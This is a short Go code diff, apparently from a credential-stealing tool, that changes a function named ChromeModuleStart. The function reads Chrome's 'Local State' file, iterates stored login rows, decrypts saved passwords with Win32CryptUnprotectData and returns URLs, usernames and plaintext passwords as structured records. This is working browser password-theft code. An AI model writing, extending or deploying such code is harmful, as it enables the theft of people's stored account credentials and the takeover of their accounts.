@@ -16,7 +16,7 @@ var (
 	}
 )
 
-func ChromeModuleStart(path string) ([]string, bool){
+func ChromeModuleStart(path string) ([]common.CredentialsData, bool){
 	if _, err := os.Stat(path + "\\Local State"); err == nil {
 		fileWithUserData, err := ioutil.ReadFile(path + "\\Local state")
 		if err != nil {
@@ -55,10 +55,11 @@ func ChromeModuleStart(path string) ([]string, bool){
 				return nil, false
 			}
 			var actionUrl, username, password string
-			var data []string
+			var data []common.CredentialsData
 			for rows.Next(){
 				rows.Scan(&actionUrl, &username, &password)
-				data = append(data, fmt.Sprintf("%s %s %s", actionUrl, username, common.Win32CryptUnprotectData(password, false)))
+				//data = append(data, fmt.Sprintf("%s %s %s", actionUrl, username, common.Win32CryptUnprotectData(password, false)))
+				data = append(data, common.CredentialsData{actionUrl, username, common.Win32CryptUnprotectData(password, false)})
 			}
 
 			return data, true
